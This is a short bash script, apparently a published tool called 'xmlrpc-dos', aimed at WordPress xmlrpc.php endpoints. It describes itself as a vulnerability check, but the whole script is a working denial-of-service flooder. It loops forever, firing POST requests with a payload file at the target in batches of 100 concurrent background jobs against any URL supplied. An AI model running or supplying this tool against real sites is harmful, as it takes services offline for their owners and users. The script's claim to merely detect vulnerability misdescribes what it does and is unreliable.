#!/usr/bin/env bash
#
# A script that can determine whether a website is vulnerable to xmlrpc DOS.
# https://github.com/wannabewastaken/xmlrpc-dos

version=1.1

# Speed up script by not using unicode
LC_ALL=C
LANG=C

# Color definition
: "${slateBlue:=\e[38;5;61m}"
: "${green:=\e[38;5;002m}"
: "${red:=\e[38;5;001m}"
: "${reset:=\e[m}"

# Global variable limit
limit=100

# Trap (ctrl + c)
# \e[K   Erase from cursor position to end of line.
# \r     is a carriage return which often means that the cursor should move to the leftmost column.
trap "printf '\e[K\r-- EXIT\n\n'; exit" INT

# Banner
banner() { printf "%b\n" "\
${slateBlue}██ █ ${reset}xmlrpc-dos
${slateBlue}█ ██ ${reset}version (${slateBlue}v${version}${reset})\n"
}

# Usage
usage() { printf "%s\n" "\
Usage: ./${0} <url>
(e.g. 'https://dummy.com' or 'http://dummy.com')"
}

send_packet() {
    if [[ $(curl -s -k -i -X POST "${1}/xmlrpc.php" \
                       -H "Content-Type: text/html" \
                       --data-binary "@payload.txt") =~ "parse error" ]]; then
        printf "%b\n" \
        "[$(date +%H:%M:%S)] [${green}SUCCESS${reset}] [INF] packet sended to ${1}"
    else
        printf "%b\n" \
        "[$(date +%H:%M:%S)] [${red}FAILED${reset}] [INF] maybe down or not vuln."
    fi
}

# This section same as (if else)
#   &&                      if
#   ||                      else
#   while :; do ... done    Infinite loops
[[ ${#@} -gt 0 ]] && {
    [[ ${1} =~ ^https?:\/\/ ]] && {
        clear
        banner
        while :; do
            ((x=x%limit)); ((x++==0)) && wait
                send_packet ${1} &
        done
    } || {
        usage
    }
} || {
    usage
}
